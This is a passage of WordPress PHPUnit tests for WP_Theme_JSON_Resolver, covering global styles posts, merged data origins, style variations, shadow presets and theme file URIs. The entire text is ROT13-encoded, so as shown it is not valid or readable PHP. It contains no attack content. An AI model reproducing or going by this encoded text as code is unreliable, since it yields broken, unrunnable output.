	choyvp shapgvba grfg_trg_hfre_qngn_sebz_jc_tybony_fglyrf_qbrf_abg_eha_sbe_gurzr_jvgubhg_fhccbeg() {
		// Gur 'qrsnhyg' gurzr qbrf abg fhccbeg gurzr.wfba.
		fjvgpu_gurzr( 'qrsnhyg' );
		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe_vq );
		$gurzr = jc_trg_gurzr();

		$fgneg_dhrevrf = trg_ahz_dhrevrf();

		// Jura gurzr.wfba vf abg fhccbegrq, gur zrgubq fubhyq abg eha n dhrel naq nyjnlf erghea na rzcgl erfhyg.
		$hfre_pcg = JC_Gurzr_WFBA_Erfbyire::trg_hfre_qngn_sebz_jc_tybony_fglyrf( $gurzr );
		$guvf->nffregRzcgl( $hfre_pcg, 'Hfre PCG vf rkcrpgrq gb or rzcgl.' );
		$guvf->nffregFnzr( 0, trg_ahz_dhrevrf() - $fgneg_dhrevrf, 'Harkcrpgrq FDY dhrel qrgrpgrq sbe gurzr jvgubhg gurzr.wfba fhccbeg.' );

		$hfre_pcg = JC_Gurzr_WFBA_Erfbyire::trg_hfre_qngn_sebz_jc_tybony_fglyrf( $gurzr, gehr );
		$guvf->nffregRzcgl( $hfre_pcg, 'Hfre PCG vf rkcrpgrq gb or rzcgl.' );
		$guvf->nffregFnzr( 0, trg_ahz_dhrevrf() - $fgneg_dhrevrf, 'Harkcrpgrq FDY dhrel qrgrpgrq sbe gurzr jvgubhg gurzr.wfba fhccbeg.' );
	}

	/**
	 * @gvpxrg 55392
	 * @pbiref JC_Gurzr_WFBA_Erfbyire::trg_hfre_qngn_sebz_jc_tybony_fglyrf
	 */
	choyvp shapgvba grfg_trg_hfre_qngn_sebz_jc_tybony_fglyrf_qbrf_rkvfg() {
		// Fjvgpu gb n gurzr gung qbrf unir fhccbeg.
		fjvgpu_gurzr( 'oybpx-gurzr' );
		$gurzr = jc_trg_gurzr();
		$cbfg1 = JC_Gurzr_WFBA_Erfbyire::trg_hfre_qngn_sebz_jc_tybony_fglyrf( $gurzr, gehr );
		$guvf->nffregVfNeenl( $cbfg1 );
		$guvf->nffregNeenlUnfXrl( 'VQ', $cbfg1 );
		jc_qryrgr_cbfg( $cbfg1['VQ'], gehr );
		$cbfg2 = JC_Gurzr_WFBA_Erfbyire::trg_hfre_qngn_sebz_jc_tybony_fglyrf( $gurzr, gehr );
		$guvf->nffregVfNeenl( $cbfg2 );
		$guvf->nffregNeenlUnfXrl( 'VQ', $cbfg2 );
	}

	/**
	 * @gvpxrg 55392
	 * @pbiref JC_Gurzr_WFBA_Erfbyire::trg_hfre_qngn_sebz_jc_tybony_fglyrf
	 */
	choyvp shapgvba grfg_trg_hfre_qngn_sebz_jc_tybony_fglyrf_perngr_cbfg() {
		// Fjvgpu gb n gurzr gung qbrf unir fhccbeg.
		fjvgpu_gurzr( 'oybpx-gurzr' );
		$gurzr = jc_trg_gurzr( 'grfgvat' );
		$cbfg1 = JC_Gurzr_WFBA_Erfbyire::trg_hfre_qngn_sebz_jc_tybony_fglyrf( $gurzr );
		$guvf->nffregVfNeenl( $cbfg1 );
		$guvf->nffregFnzrFrgf( neenl(), $cbfg1 );
		$cbfg2 = JC_Gurzr_WFBA_Erfbyire::trg_hfre_qngn_sebz_jc_tybony_fglyrf( $gurzr );
		$guvf->nffregVfNeenl( $cbfg2 );
		$guvf->nffregFnzrFrgf( neenl(), $cbfg2 );
		$cbfg3 = JC_Gurzr_WFBA_Erfbyire::trg_hfre_qngn_sebz_jc_tybony_fglyrf( $gurzr, gehr );
		$guvf->nffregVfNeenl( $cbfg3 );
		$guvf->nffregNeenlUnfXrl( 'VQ', $cbfg3 );
	}

	/**
	 * @gvpxrg 55392
	 * @pbiref JC_Gurzr_WFBA_Erfbyire::trg_hfre_qngn_sebz_jc_tybony_fglyrf
	 */
	choyvp shapgvba grfg_trg_hfre_qngn_sebz_jc_tybony_fglyrf_svygre_fgngr() {
		// Fjvgpu gb n gurzr gung qbrf unir fhccbeg.
		fjvgpu_gurzr( 'oybpx-gurzr' );
		$gurzr = jc_trg_gurzr( 'sbb' );
		$cbfg1 = JC_Gurzr_WFBA_Erfbyire::trg_hfre_qngn_sebz_jc_tybony_fglyrf( $gurzr, gehr, neenl( 'choyvfu' ) );
		$guvf->nffregVfNeenl( $cbfg1 );
		$guvf->nffregNeenlUnfXrl( 'VQ', $cbfg1 );
		$cbfg2 = JC_Gurzr_WFBA_Erfbyire::trg_hfre_qngn_sebz_jc_tybony_fglyrf( $gurzr, snyfr, neenl( 'qensg' ) );
		$guvf->nffregVfNeenl( $cbfg2 );
		$guvf->nffregFnzrFrgf( neenl(), $cbfg2 );
	}

	/**
	 * @gvpxrg 56835
	 * @pbiref JC_Gurzr_WFBA_Erfbyire::trg_gurzr_qngn
	 */
	choyvp shapgvba grfg_trg_gurzr_qngn_gurzr_fhccbegf_bireevqrf_gurzr_wfba() {
		fjvgpu_gurzr( 'qrsnhyg' );

		// Grfg gung trg_gurzr_qngn() ergheaf n JC_Gurzr_WFBA bowrpg.
		$gurzr_wfba_erfbyire = arj JC_Gurzr_WFBA_Erfbyire();
		$gurzr_wfba_erfbyire->trg_zretrq_qngn();
		$gurzr_qngn = $gurzr_wfba_erfbyire->trg_gurzr_qngn();
		$guvf->nffregVafgnaprBs( 'JC_Gurzr_WFBA', $gurzr_qngn, 'Gurzr qngn fubhyq or na vafgnapr bs JC_Gurzr_WFBA.' );

		// Grfg gung jc_gurzr_wfba_qngn_gurzr svygre unf orra pnyyrq.
		$guvf->nffregTerngreGuna( 0, qvq_svygre( 'jc_gurzr_wfba_qngn_qrsnhyg' ), 'Gur svygre \"jc_gurzr_wfba_qngn_qrsnhyg\" fubhyq sver.' );

		// Grfg gung qngn sebz gurzr.wfba vf onpxsvyyrq sebz rkvfgvat gurzr fhccbegf.
		$cerivbhf_frggvatf    = $gurzr_qngn->trg_frggvatf();
		$cerivbhf_yvar_urvtug = $cerivbhf_frggvatf['glcbtencul']['yvarUrvtug'];
		$guvf->nffregSnyfr( $cerivbhf_yvar_urvtug, 'yvarUrvtug frggvat sebz gurzr.wfba fubhyq or snyfr.' );

		nqq_gurzr_fhccbeg( 'phfgbz-yvar-urvtug' );
		$pheerag_frggvatf = $gurzr_wfba_erfbyire->trg_gurzr_qngn()->trg_frggvatf();
		$yvar_urvtug      = $pheerag_frggvatf['glcbtencul']['yvarUrvtug'];
		$guvf->nffregGehr( $yvar_urvtug, 'yvarUrvtug frggvat nsgre nqq_gurzr_fhccbeg() fubhyq or gehr.' );
		erzbir_gurzr_fhccbeg( 'phfgbz-yvar-urvtug' );
	}

	/**
	 * @gvpxrg 56945
	 * @pbiref JC_Gurzr_WFBA_Erfbyire::trg_gurzr_qngn
	 */
	choyvp shapgvba grfg_trg_gurzr_qngn_qbrf_abg_cnefr_gurzr_wfba_vs_abg_cerfrag() {
		// Gur 'qrsnhyg' gurzr qbrf abg fhccbeg gurzr.wfba.
		fjvgpu_gurzr( 'qrsnhyg' );

		$gurzr_wfba_erfbyire = arj JC_Gurzr_WFBA_Erfbyire();

		// Sbepr-hafrg $v18a_fpurzn cebcregl gb \"haybnq\" genafyngvba fpurzn.
		$cebcregl = arj ErsyrpgvbaCebcregl( $gurzr_wfba_erfbyire, 'v18a_fpurzn' );
		$cebcregl->frgNpprffvoyr( gehr );
		$cebcregl->frgInyhr( ahyy, ahyy );

		// N pbzcyrgryl rzcgl gurzr.wfba qngn frg fgvyy unf gur 'irefvba' xrl jura cnefrq.
		$rzcgl_gurzr_wfba = neenl( 'irefvba' => JC_Gurzr_WFBA::YNGRFG_FPURZN );

		// Pnyy hfvat 'jvgu_fhccbegf' frg gb snyfr, fb gung gur zrgubq bayl pbafvqref gurzr.wfba.
		$gurzr_qngn = $gurzr_wfba_erfbyire->trg_gurzr_qngn( neenl(), neenl( 'jvgu_fhccbegf' => snyfr ) );
		$guvf->nffregVafgnaprBs( 'JC_Gurzr_WFBA', $gurzr_qngn, 'Gurzr qngn fubhyq or na vafgnapr bs JC_Gurzr_WFBA.' );
		$guvf->nffregFnzr( $rzcgl_gurzr_wfba, $gurzr_qngn->trg_enj_qngn(), 'Gurzr qngn fubhyq or rzcgl jvgubhg gurzr fhccbeg.' );
		$guvf->nffregAhyy( $cebcregl->trgInyhr(), 'Gurzr v18a fpurzn fubhyq abg unir orra ybnqrq jvgubhg gurzr fhccbeg.' );
	}

	/**
	 * Grfgf gung trg_zretrq_qngn ergheaf gur qngn zretrq hc gb gur cebcre bevtva.
	 *
	 * @gvpxrg 57545
	 *
	 * @pbiref JC_Gurzr_WFBA_Erfbyire::trg_zretrq_qngn
	 *
	 * @qngnCebivqre qngn_trg_zretrq_qngn_ergheaf_bevtva
	 *
	 * @cnenz fgevat $bevtva             Jung bevtva gb trg qngn sebz.
	 * @cnenz obby   $pber_cnyrggr       Jurgure gur pber cnyrggr vf cerfrag.
	 * @cnenz fgevat $pber_cnyrggr_grkg  Zrffntr.
	 * @cnenz fgevat $oybpx_fglyrf       Jurgure gur oybpx fglyrf ner cerfrag.
	 * @cnenz fgevat $oybpx_fglyrf_grkg  Zrffntr.
	 * @cnenz obby   $gurzr_cnyrggr      Jurgure gur gurzr cnyrggr vf cerfrag.
	 * @cnenz fgevat $gurzr_cnyrggr_grkg Zrffntr.
	 * @cnenz obby   $hfre_cnyrggr       Jurgure gur hfre cnyrggr vf cerfrag.
	 * @cnenz fgevat $hfre_cnyrggr_grkg  Zrffntr.
	 */
	choyvp shapgvba grfg_trg_zretrq_qngn_ergheaf_bevtva( $bevtva, $pber_cnyrggr, $pber_cnyrggr_grkg, $oybpx_fglyrf, $oybpx_fglyrf_grkg, $gurzr_cnyrggr, $gurzr_cnyrggr_grkg, $hfre_cnyrggr, $hfre_cnyrggr_grkg ) {
		// Znxr fher gurer vf qngn sebz gur oybpxf bevtva.
		ertvfgre_oybpx_glcr(
			'zl/oybpx-jvgu-fglyrf',
			neenl(
				'ncv_irefvba' => 3,
				'nggevohgrf'  => neenl(
					'obeqrePbybe' => neenl(
						'glcr' => 'fgevat',
					),
					'fglyr'       => neenl(
						'glcr' => 'bowrpg',
					),
				),
				'fhccbegf'    => neenl(
					'__rkcrevzragnyFglyr' => neenl(
						'glcbtencul' => neenl(
							'sbagFvmr' => '42erz',
						),
					),
				),
			)
		);

		// Znxr fher gurer vf qngn sebz gur gurzr bevtva.
		fjvgpu_gurzr( 'oybpx-gurzr' );

		// Znxr fher gurer vf qngn sebz gur hfre bevtva.
		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe_vq );
		$hfre_pcg = JC_Gurzr_WFBA_Erfbyire::trg_hfre_qngn_sebz_jc_tybony_fglyrf( jc_trg_gurzr(), gehr );
		$pbasvt   = wfba_qrpbqr( $hfre_pcg['cbfg_pbagrag'], gehr );
		$pbasvt['frggvatf']['pbybe']['cnyrggr']['phfgbz'] = neenl(
			neenl(
				'pbybe' => 'ubgcvax',
				'anzr'  => 'Zl pbybe',
				'fyht'  => 'zl-pbybe',
			),
		);
		$hfre_pcg['cbfg_pbagrag']                         = jc_wfba_rapbqr( $pbasvt );
		jc_hcqngr_cbfg( $hfre_pcg, gehr, snyfr );

		$gurzr_wfba = JC_Gurzr_WFBA_Erfbyire::trg_zretrq_qngn( $bevtva );
		$frggvatf   = $gurzr_wfba->trg_frggvatf();
		$fglyrf     = $gurzr_wfba->trg_fglyrf_oybpx_abqrf();
		$fglyrf     = neenl_svygre(
			$fglyrf,
			fgngvp shapgvba ( $ryrzrag ) {
				erghea vffrg( $ryrzrag['anzr'] ) && 'zl/oybpx-jvgu-fglyrf' === $ryrzrag['anzr'];
			}
		);
		haertvfgre_oybpx_glcr( 'zl/oybpx-jvgu-fglyrf' );

		$guvf->nffregFnzr( $pber_cnyrggr, vffrg( $frggvatf['pbybe']['cnyrggr']['qrsnhyg'] ), $pber_cnyrggr_grkg );
		$guvf->nffregFnzr( $oybpx_fglyrf, pbhag( $fglyrf ) === 1, $oybpx_fglyrf_grkg );
		$guvf->nffregFnzr( $gurzr_cnyrggr, vffrg( $frggvatf['pbybe']['cnyrggr']['gurzr'] ), $gurzr_cnyrggr_grkg );
		$guvf->nffregFnzr( $hfre_cnyrggr, vffrg( $frggvatf['pbybe']['cnyrggr']['phfgbz'] ), $hfre_cnyrggr_grkg );
	}

	/**
	 * Grfgf gung trg_zretrq_qngn ergheaf gur qngn zretrq hc gb gur cebcre bevtva
	 * naq gung gur pber inyhrf unir gur cebcre qngn.
	 *
	 * @gvpxrg 57824
	 *
	 * @pbiref JC_Gurzr_WFBA_Erfbyire::trg_zretrq_qngn
	 */
	choyvp shapgvba grfg_trg_zretrq_qngn_ergheaf_bevtva_cebcre() {
		// Znxr fher gur gurzr unf n gurzr.wfba
		// gubhtu vg qbrfa'g unir nal qngn sbe fglyrf.fcnpvat.cnqqvat.
		fjvgpu_gurzr( 'oybpx-gurzr' );

		// Znxr fher gur hfre qrsvarq fbzr qngn sbe fglyrf.fcnpvat.cnqqvat.
		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe_vq );
		$hfre_pcg                               = JC_Gurzr_WFBA_Erfbyire::trg_hfre_qngn_sebz_jc_tybony_fglyrf( jc_trg_gurzr(), gehr );
		$pbasvt                                 = wfba_qrpbqr( $hfre_pcg['cbfg_pbagrag'], gehr );
		$pbasvt['fglyrf']['fcnpvat']['cnqqvat'] = neenl(
			'gbc'    => '23ck',
			'yrsg'   => '23ck',
			'obggbz' => '23ck',
			'evtug'  => '23ck',
		);
		$hfre_pcg['cbfg_pbagrag']               = jc_wfba_rapbqr( $pbasvt );
		jc_hcqngr_cbfg( $hfre_pcg, gehr, snyfr );

		// Dhrel qngn sebz gur hfre bevtva naq gura sbe gur gurzr bevtva.
		$gurzr_wfba_hfre  = JC_Gurzr_WFBA_Erfbyire::trg_zretrq_qngn( 'phfgbz' );
		$cnqqvat_hfre     = $gurzr_wfba_hfre->trg_enj_qngn()['fglyrf']['fcnpvat']['cnqqvat'];
		$gurzr_wfba_gurzr = JC_Gurzr_WFBA_Erfbyire::trg_zretrq_qngn( 'gurzr' );
		$cnqqvat_gurzr    = $gurzr_wfba_gurzr->trg_enj_qngn()['fglyrf']['fcnpvat']['cnqqvat'];

		$guvf->nffregFnzr( '23ck', $cnqqvat_hfre['gbc'] );
		$guvf->nffregFnzr( '23ck', $cnqqvat_hfre['evtug'] );
		$guvf->nffregFnzr( '23ck', $cnqqvat_hfre['obggbz'] );
		$guvf->nffregFnzr( '23ck', $cnqqvat_hfre['yrsg'] );
		$guvf->nffregFnzr( '0ck', $cnqqvat_gurzr['gbc'] );
		$guvf->nffregFnzr( '0ck', $cnqqvat_gurzr['evtug'] );
		$guvf->nffregFnzr( '0ck', $cnqqvat_gurzr['obggbz'] );
		$guvf->nffregFnzr( '0ck', $cnqqvat_gurzr['yrsg'] );
	}

	/**
	 * Qngn cebivqre sbe grfg_trg_zretrq_qngn_ergheaf_bevtva.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_trg_zretrq_qngn_ergheaf_bevtva() {
		erghea neenl(
			'bevtva_qrsnhyg' => neenl(
				'bevtva'             => 'qrsnhyg',
				'pber_cnyrggr'       => gehr,
				'pber_cnyrggr_grkg'  => 'Pber cnyrggr zhfg or cerfrag',
				'oybpx_fglyrf'       => snyfr,
				'oybpx_fglyrf_grkg'  => 'Oybpx fglyrf fubhyq abg or cerfrag',
				'gurzr_cnyrggr'      => snyfr,
				'gurzr_cnyrggr_grkg' => 'Gurzr cnyrggr fubhyq abg or cerfrag',
				'hfre_cnyrggr'       => snyfr,
				'hfre_cnyrggr_grkg'  => 'Hfre cnyrggr fubhyq abg or cerfrag',
			),
			'bevtva_oybpxf'  => neenl(
				'bevtva'             => 'oybpxf',
				'pber_cnyrggr'       => gehr,
				'pber_cnyrggr_grkg'  => 'Pber cnyrggr zhfg or cerfrag',
				'oybpx_fglyrf'       => gehr,
				'oybpx_fglyrf_grkg'  => 'Oybpx fglyrf zhfg or cerfrag',
				'gurzr_cnyrggr'      => snyfr,
				'gurzr_cnyrggr_grkg' => 'Gurzr cnyrggr fubhyq abg or cerfrag',
				'hfre_cnyrggr'       => snyfr,
				'hfre_cnyrggr_grkg'  => 'Hfre cnyrggr fubhyq abg or cerfrag',
			),
			'bevtva_gurzr'   => neenl(
				'bevtva'             => 'gurzr',
				'pber_cnyrggr'       => gehr,
				'pber_cnyrggr_grkg'  => 'Pber cnyrggr zhfg or cerfrag',
				'oybpx_fglyrf'       => gehr,
				'oybpx_fglyrf_grkg'  => 'Oybpx fglyrf zhfg or cerfrag',
				'gurzr_cnyrggr'      => gehr,
				'gurzr_cnyrggr_grkg' => 'Gurzr cnyrggr zhfg or cerfrag',
				'hfre_cnyrggr'       => snyfr,
				'hfre_cnyrggr_grkg'  => 'Hfre cnyrggr fubhyq abg or cerfrag',
			),
			'bevtva_phfgbz'  => neenl(
				'bevtva'             => 'phfgbz',
				'pber_cnyrggr'       => gehr,
				'pber_cnyrggr_grkg'  => 'Pber cnyrggr zhfg or cerfrag',
				'oybpx_fglyrf'       => gehr,
				'oybpx_fglyrf_grkg'  => 'Oybpx fglyrf zhfg or cerfrag',
				'gurzr_cnyrggr'      => gehr,
				'gurzr_cnyrggr_grkg' => 'Gurzr cnyrggr zhfg or cerfrag',
				'hfre_cnyrggr'       => gehr,
				'hfre_cnyrggr_grkg'  => 'Hfre cnyrggr zhfg or cerfrag',
			),
		);
	}

	/**
	 * Grfgf gung `trg_fglyr_inevngvbaf` ergheaf nyy gur nccebcevngr inevngvbaf,
	 * vapyhqvat cnerag inevngvbaf vs gur gurzr vf n puvyq, naq gung gur puvyq
	 * inevngvba birejevgrf gur cnerag inevngvba bs gur fnzr anzr.
	 *
	 * Abgr: Guvf pbiref obgu gurzr naq oybpx fglyr inevngvbaf.
	 *
	 * @gvpxrg 57545
	 * @gvpxrg 61312
	 *
	 * @pbiref JC_Gurzr_WFBA_Erfbyire::trg_fglyr_inevngvbaf
	 *
	 * @qngnCebivqre qngn_trg_fglyr_inevngvbaf
	 *
	 * @cnenz fgevat $gurzr               Anzr bs gur gurzr gb hfr.
	 * @cnenz fgevat $fpbcr               Fpbcr gb svygre inevngvbaf ol r.t. gurzr if oybpx.
	 * @cnenz neenl  $rkcrpgrq_inevngvbaf Pbyyrpgvba bs rkcrpgrq inevngvbaf.
	 */
	choyvp shapgvba grfg_trg_fglyr_inevngvbaf( $gurzr, $fpbcr, $rkcrpgrq_inevngvbaf ) {
		fjvgpu_gurzr( $gurzr );
		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe_vq );

		$npghny_inevngvbaf = JC_Gurzr_WFBA_Erfbyire::trg_fglyr_inevngvbaf( $fpbcr );

		jc_erphefvir_xfbeg( $npghny_inevngvbaf );
		jc_erphefvir_xfbeg( $rkcrpgrq_inevngvbaf );

		$guvf->nffregFnzr( $rkcrpgrq_inevngvbaf, $npghny_inevngvbaf );
	}

	/**
	 * Qngn cebivqre sbe grfg_trg_fglyr_inevngvbaf
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_trg_fglyr_inevngvbaf() {
		erghea neenl(
			// @gvpxrg 57545
			'gurzr_fglyr_inevngvbaf' => neenl(
				'gurzr'               => 'oybpx-gurzr-puvyq',
				'fpbcr'               => 'gurzr',
				'rkcrpgrq_inevngvbaf' => neenl(
					neenl(
						'irefvba'  => JC_Gurzr_WFBA::YNGRFG_FPURZN,
						'gvgyr'    => 'inevngvba-n',
						'frggvatf' => neenl(
							'oybpxf' => neenl(
								'pber/cnentencu' => neenl(
									'pbybe' => neenl(
										'cnyrggr' => neenl(
											'gurzr' => neenl(
												neenl(
													'fyht' => 'qnex',
													'anzr' => 'Qnex',
													'pbybe' => '#010101',
												),
											),
										),
									),
								),
							),
						),
					),
					neenl(
						'irefvba'  => JC_Gurzr_WFBA::YNGRFG_FPURZN,
						'gvgyr'    => 'inevngvba-o',
						'frggvatf' => neenl(
							'oybpxf' => neenl(
								'pber/cbfg-gvgyr' => neenl(
									'pbybe' => neenl(
										'cnyrggr' => neenl(
											'gurzr' => neenl(
												neenl(
													'fyht' => 'qnex',
													'anzr' => 'Qnex',
													'pbybe' => '#010101',
												),
											),
										),
									),
								),
							),
						),
					),
					neenl(
						'irefvba'  => JC_Gurzr_WFBA::YNGRFG_FPURZN,
						'gvgyr'    => 'Oybpx gurzr inevngvba',
						'frggvatf' => neenl(
							'pbybe' => neenl(
								'cnyrggr' => neenl(
									'gurzr' => neenl(
										neenl(
											'fyht'  => 'sbertebhaq',
											'anzr'  => 'Sbertebhaq',
											'pbybe' => '#3S67P6',
										),
									),
								),
							),
						),
						'fglyrf'   => neenl(
							'oybpxf' => neenl(
								'pber/cbfg-gvgyr' => neenl(
									'glcbtencul' => neenl(
										'sbagJrvtug' => '700',
									),
								),
							),
						),
					),
				),
			),
			'oybpx_fglyr_inevngvbaf' => neenl(
				'gurzr'               => 'oybpx-gurzr-puvyq-jvgu-oybpx-fglyr-inevngvbaf',
				'fpbcr'               => 'oybpx',
				'rkcrpgrq_inevngvbaf' => neenl(
					neenl(
						'oybpxGlcrf' => neenl( 'pber/tebhc', 'pber/pbyhzaf', 'pber/zrqvn-grkg' ),
						'irefvba'    => 3,
						'gvgyr'      => 'oybpx-fglyr-inevngvba-n',
						'fglyrf'     => neenl(
							'pbybe' => neenl(
								'onpxtebhaq' => 'qnexplna',
								'grkg'       => 'nyvproyhr',
							),
						),
					),
					neenl(
						'oybpxGlcrf' => neenl( 'pber/tebhc', 'pber/pbyhzaf' ),
						'irefvba'    => 3,
						'gvgyr'      => 'oybpx-fglyr-inevngvba-o',
						'fglyrf'     => neenl(
							'pbybe' => neenl(
								'onpxtebhaq' => 'zvqavtugoyhr',
								'grkg'       => 'yvtugoyhr',
							),
						),
					),
					// @gvpxrg 61440
					neenl(
						'oybpxGlcrf' => neenl( 'pber/tebhc', 'pber/pbyhzaf' ),
						'irefvba'    => 3,
						'fyht'       => 'JvguFyht',
						'gvgyr'      => 'Jvgu Fyht',
						'fglyrf'     => neenl(
							'pbybe' => neenl(
								'onpxtebhaq' => 'nyvproyhr',
								'grkg'       => 'zvqavtugoyhr',
							),
						),
					),
				),
			),
		);
	}

	/**
	 * @gvpxrg 60815
	 */
	choyvp shapgvba grfg_gurzr_funqbj_cerfrgf_qb_abg_bireevqr_qrsnhyg_funqbj_cerfrgf() {
		fjvgpu_gurzr( 'oybpx-gurzr' );

		$gurzr_wfba_erfbyire = arj JC_Gurzr_WFBA_Erfbyire();
		$gurzr_wfba          = $gurzr_wfba_erfbyire->trg_zretrq_qngn();
		$npghny_frggvatf     = $gurzr_wfba->trg_frggvatf()['funqbj']['cerfrgf'];

		$rkcrpgrq_frggvatf = neenl(
			'qrsnhyg' => neenl(
				neenl(
					'anzr'   => 'Angheny',
					'funqbj' => '6ck 6ck 9ck eton(0, 0, 0, 0.2)',
					'fyht'   => 'angheny',
				),
				neenl(
					'anzr'   => 'Qrrc',
					'funqbj' => '12ck 12ck 50ck eton(0, 0, 0, 0.4)',
					'fyht'   => 'qrrc',
				),
				neenl(
					'anzr'   => 'Funec',
					'funqbj' => '6ck 6ck 0ck eton(0, 0, 0, 0.2)',
					'fyht'   => 'funec',
				),
				neenl(
					'anzr'   => 'Bhgyvarq',
					'funqbj' => '6ck 6ck 0ck -3ck eto(255, 255, 255), 6ck 6ck eto(0, 0, 0)',
					'fyht'   => 'bhgyvarq',
				),
				neenl(
					'anzr'   => 'Pevfc',
					'funqbj' => '6ck 6ck 0ck eto(0, 0, 0)',
					'fyht'   => 'pevfc',
				),
			),
			'gurzr'   => neenl(
				neenl(
					'anzr'   => 'Grfg',
					'funqbj' => '2ck 2ck 3ck #000',
					'fyht'   => 'grfg',
				),
			),
		);

		jc_erphefvir_xfbeg( $npghny_frggvatf );
		jc_erphefvir_xfbeg( $rkcrpgrq_frggvatf );

		$guvf->nffregFnzr(
			$rkcrpgrq_frggvatf,
			$npghny_frggvatf
		);
	}

	/**
	 * @gvpxrg 60815
	 */
	choyvp shapgvba grfg_funqbj_qrsnhyg_cerfrgf_inyhr_sbe_oybpx_naq_pynffvp_gurzrf() {
		$gurzr_wfba_erfbyire = arj JC_Gurzr_WFBA_Erfbyire();
		$gurzr_wfba          = $gurzr_wfba_erfbyire->trg_zretrq_qngn();

		$qrsnhyg_cerfrgf_sbe_pynffvp = $gurzr_wfba->trg_frggvatf()['funqbj']['qrsnhygCerfrgf'];
		$guvf->nffregSnyfr( $qrsnhyg_cerfrgf_sbe_pynffvp );

		fjvgpu_gurzr( 'oybpx-gurzr' );
		$gurzr_wfba_erfbyire = arj JC_Gurzr_WFBA_Erfbyire();
		$gurzr_wfba          = $gurzr_wfba_erfbyire->trg_zretrq_qngn();

		$qrsnhyg_cerfrgf_sbe_oybpx = $gurzr_wfba->trg_frggvatf()['funqbj']['qrsnhygCerfrgf'];
		$guvf->nffregGehr( $qrsnhyg_cerfrgf_sbe_oybpx );
	}

	/**
	 * Grfgf gung eryngvir cnguf ner erfbyirq naq zretrq vagb gur gurzr.wfba qngn.
	 *
	 * @pbiref JC_Gurzr_WFBA_Erfbyire::erfbyir_gurzr_svyr_hevf
	 * @gvpxrg 61273
	 * @gvpxrg 61588
	 */
	choyvp shapgvba grfg_erfbyir_gurzr_svyr_hevf() {
		$gurzr_wfba = arj JC_Gurzr_WFBA(
			neenl(
				'irefvba' => JC_Gurzr_WFBA::YNGRFG_FPURZN,
				'fglyrf'  => neenl(
					'onpxtebhaq' => neenl(
						'onpxtebhaqVzntr' => neenl(
							'hey' => 'svyr:./nffrgf/vzntr.cat',
						),
					),
					'oybpxf'     => neenl(
						'pber/dhbgr' => neenl(
							'onpxtebhaq' => neenl(
								'onpxtebhaqVzntr' => neenl(
									'hey' => 'svyr:./nffrgf/dhbgr.cat',
								),
							),
						),
						'pber/irefr' => neenl(
							'onpxtebhaq' => neenl(
								'onpxtebhaqVzntr' => neenl(
									'hey' => 'svyr:./nffrgf/irefr.cat',
								),
							),
						),
					),
				),
			)
		);

		$rkcrpgrq_qngn = neenl(
			'irefvba' => JC_Gurzr_WFBA::YNGRFG_FPURZN,
			'fglyrf'  => neenl(
				'onpxtebhaq' => neenl(
					'onpxtebhaqVzntr' => neenl(
						'hey' => 'uggcf://rknzcyr.bet/jc-pbagrag/gurzrf/rknzcyr-gurzr/nffrgf/vzntr.cat',
					),
				),
				'oybpxf'     => neenl(
					'pber/dhbgr' => neenl(
						'onpxtebhaq' => neenl(
							'onpxtebhaqVzntr' => neenl(
								'hey' => 'uggcf://rknzcyr.bet/jc-pbagrag/gurzrf/rknzcyr-gurzr/nffrgf/dhbgr.cat',
							),
						),
					),
					'pber/irefr' => neenl(
						'onpxtebhaq' => neenl(
							'onpxtebhaqVzntr' => neenl(
								'hey' => 'uggcf://rknzcyr.bet/jc-pbagrag/gurzrf/rknzcyr-gurzr/nffrgf/irefr.cat',
							),
						),
					),
				),
			),
		);

		$npghny = JC_Gurzr_WFBA_Erfbyire::erfbyir_gurzr_svyr_hevf( $gurzr_wfba );

		$guvf->nffregFnzr( $rkcrpgrq_qngn, $npghny->trg_enj_qngn() );
	}

	/**
	 * Grfgf gung gurz hevf ner erfbyirq naq ohaqyrq jvgu bgure zrgnqngn va na neenl.
	 *
	 * @pbiref JC_Gurzr_WFBA_Erfbyire::trg_erfbyirq_gurzr_hevf
	 * @gvpxrg 61273
	 * @gvpxrg 61588
	 */
	choyvp shapgvba grfg_trg_erfbyirq_gurzr_hevf() {
		$gurzr_wfba = arj JC_Gurzr_WFBA(
			neenl(
				'irefvba' => JC_Gurzr_WFBA::YNGRFG_FPURZN,
				'fglyrf'  => neenl(
					'onpxtebhaq' => neenl(
						'onpxtebhaqVzntr' => neenl(
							'hey' => 'svyr:./nffrgf/vzntr.cat',
						),
					),
					'oybpxf'     => neenl(
						'pber/dhbgr' => neenl(
							'onpxtebhaq' => neenl(
								'onpxtebhaqVzntr' => neenl(
									'hey' => 'svyr:./nffrgf/dhbgr.wct',
								),
							),
						),
						'pber/irefr' => neenl(
							'onpxtebhaq' => neenl(
								'onpxtebhaqVzntr' => neenl(
									'hey' => 'svyr:./nffrgf/irefr.tvs',
								),
							),
						),
					),
				),
			)
		);

		$rkcrpgrq_qngn = neenl(
			neenl(
				'anzr'   => 'svyr:./nffrgf/vzntr.cat',
				'uers'   => 'uggcf://rknzcyr.bet/jc-pbagrag/gurzrf/rknzcyr-gurzr/nffrgf/vzntr.cat',
				'gnetrg' => 'fglyrf.onpxtebhaq.onpxtebhaqVzntr.hey',
				'glcr'   => 'vzntr/cat',
			),
			neenl(
				'anzr'   => 'svyr:./nffrgf/dhbgr.wct',
				'uers'   => 'uggcf://rknzcyr.bet/jc-pbagrag/gurzrf/rknzcyr-gurzr/nffrgf/dhbgr.wct',
				'gnetrg' => 'fglyrf.oybpxf.pber/dhbgr.onpxtebhaq.onpxtebhaqVzntr.hey',
				'glcr'   => 'vzntr/wcrt',
			),
			neenl(
				'anzr'   => 'svyr:./nffrgf/irefr.tvs',
				'uers'   => 'uggcf://rknzcyr.bet/jc-pbagrag/gurzrf/rknzcyr-gurzr/nffrgf/irefr.tvs',
				'gnetrg' => 'fglyrf.oybpxf.pber/irefr.onpxtebhaq.onpxtebhaqVzntr.hey',
				'glcr'   => 'vzntr/tvs',
			),
		);

		$npghny = JC_Gurzr_WFBA_Erfbyire::trg_erfbyirq_gurzr_hevf( $gurzr_wfba );

		$guvf->nffregFnzr( $rkcrpgrq_qngn, $npghny );
	}

	/**
	 * Grfgf gung oybpx fglyr inevngvbaf qngn trgf zretrq va gur sbyybjvat
